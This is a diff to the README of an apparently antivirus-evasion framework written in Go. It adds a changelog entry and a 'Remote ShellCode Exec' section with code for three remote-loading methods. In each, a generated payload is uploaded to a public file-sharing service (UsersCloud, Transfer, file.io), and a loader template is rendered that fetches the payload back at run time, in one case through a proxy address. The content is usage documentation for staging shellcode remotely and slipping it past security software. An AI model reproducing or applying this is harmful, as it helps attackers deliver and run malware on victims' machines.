@@ -14,6 +14,14 @@ Go Anti-Virus Framework
 
 ### 更新日志
 
+### 2024.2.6
+
+1. 新增两种远程加载的方式`UsersCloud, file.io (web)`
+2. 新增`github.com/imroc/req/v3`的请求客户端
+3. 优化远程加载模块的函数描述
+4. 简化远程模块上传加密文件的结构体
+5. 模板更新，兼容新的远程加载方式
+
 ### 2024.2.5
 
 1. 新增参数加载模块，可以自定义(随机)密钥
@@ -84,6 +92,59 @@ type Data struct {
 	Apart         interface{} // 分离加载模块
 	Dynamic       interface{} // 动态数据
 }
+```
+
+## Remote ShellCode Exec
+
+### UsersCloud
+
+```go
+	// 上传远程加载的Payload到第三方
+	uc := remote.UsersCloud{
+		Path: "output",
+		Src:  params.FileName,
+	}
+
+	// 设置远程加载渲染模板
+	remoteSet := render.Remote{
+		Import:     "variant/remote",
+		UCFileCode: uc.UCUpload(),
+		UCMethod:   "remote.UCRead",
+	}
+```
+
+### Transfer
+
+```go
+	// 上传远程加载的Payload到第三方
+	cUrl := remote.Transfer{
+		Src:   params.FileName,
+		Path:  "D:\\variant\\output\\",
+		Proxy: "192.168.31.10:2080",
+	}
+	// 设置远程加载渲染模板
+	remoteSet := render.Remote{
+		Import:  "variant/remote",
+		Url:     cUrl.CurlUpload(),
+		Method:  "remote.RestyStrings",
+	}
+```
+
+### File.io
+
+```go
+	// 上传远程加载的Payload到第三方
+	fi := remote.FileIO{
+		Src:  params.FileName,
+		Path: "output",
+	}
+
+	// 设置远程加载渲染模板
+	remoteSet := render.Remote{
+		Import: "variant/remote",
+		Url:    fi.Upload(),
+		Method: "remote.FileIORead",
+	}
 ```
 
 ## Demo
